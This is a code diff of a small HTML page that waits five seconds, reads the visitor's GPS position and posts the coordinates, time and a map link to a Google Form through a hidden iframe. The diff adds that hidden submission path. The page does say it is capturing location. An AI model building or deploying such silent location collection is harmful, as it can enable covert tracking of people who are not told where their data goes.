@@ -2,12 +2,12 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>GPS Auto Submit App</title>
+<title>GPS Tracker Fixed</title>
 
 <style>
   body {
     font-family: Arial;
-    background: linear-gradient(135deg, #eef2f7, #d9e4f5);
+    background: #eef2f7;
     text-align: center;
     padding-top: 100px;
   }
@@ -24,12 +24,11 @@
   #timer {
     font-size: 42px;
     color: #007bff;
-    margin: 15px 0;
   }
 
   #status {
     font-size: 14px;
-    color: #444;
+    margin-top: 10px;
   }
 </style>
 </head>
@@ -38,36 +37,32 @@
 
 <div class="card">
   <h3>GPS Tracker</h3>
-  <p>Capturing location automatically...</p>
+  <p>Capturing location...</p>
 
   <div id="timer">5</div>
   <p id="status">Starting...</p>
 </div>
 
+<iframe name="hidden_iframe" style="display:none;"></iframe>
+
 <script>
-let timeLeft = 5;
-const timerEl = document.getElementById("timer");
-const statusEl = document.getElementById("status");
+let t = 5;
+const timer = document.getElementById("timer");
+const status = document.getElementById("status");
 
-// Countdown before GPS capture
-const countdown = setInterval(() => {
-  timeLeft--;
-  timerEl.innerHTML = timeLeft;
+const count = setInterval(() => {
+  t--;
+  timer.innerHTML = t;
 
-  if (timeLeft === 0) {
-    clearInterval(countdown);
+  if (t === 0) {
+    clearInterval(count);
     getLocation();
   }
 }, 1000);
 
 function getLocation() {
 
-  if (!navigator.geolocation) {
-    statusEl.innerHTML = "Geolocation not supported";
-    return;
-  }
-
-  statusEl.innerHTML = "Getting GPS...";
+  status.innerHTML = "Getting GPS...";
 
   navigator.geolocation.getCurrentPosition(function(pos) {
 
@@ -75,32 +70,36 @@ function getLocation() {
     const lon = pos.coords.longitude;
     const time = new Date().toLocaleString();
 
-    const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+    const map = "https://www.google.com/maps?q=" + lat + "," + lon;
 
-    const finalData =
-      "Latitude: " + lat +
-      " | Longitude: " + lon +
+    const value =
+      "Lat: " + lat +
+      " | Lon: " + lon +
       " | Time: " + time +
-      " | Map: " + mapLink;
+      " | Map: " + map;
 
-    statusEl.innerHTML = "Submitting...";
+    status.innerHTML = "Submitting...";
 
-    // SUBMIT TO GOOGLE FORM
-    const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSd4KJoIXicff1vBOAH1VgmFNBFUcGBSxf6iQE08eqOSWAXC_w/formResponse";
+    // ✔ REAL GOOGLE FORM SUBMIT (NO FETCH)
+    const form = document.createElement("form");
+    form.method = "POST";
+    form.action = "https://docs.google.com/forms/d/e/1FAIpQLSd4KJoIXicff1vBOAH1VgmFNBFUcGBSxf6iQE08eqOSWAXC_w/formResponse";
+    form.target = "hidden_iframe";
 
-    const data = new FormData();
-    data.append("entry.1341563402", finalData);
+    const input = document.createElement("input");
+    input.type = "hidden";
+    input.name = "entry.1341563402";
+    input.value = value;
 
-    fetch(formURL, {
-      method: "POST",
-      body: data,
-      mode: "no-cors"
-    });
+    form.appendChild(input);
+    document.body.appendChild(form);
 
-    statusEl.innerHTML = "✅ Submitted successfully";
+    form.submit();
+
+    status.innerHTML = "✅ Submitted";
 
   }, function(err) {
-    statusEl.innerHTML = "❌ Error: " + err.message;
+    status.innerHTML = "Error: " + err.message;
   });
 }
 </script>
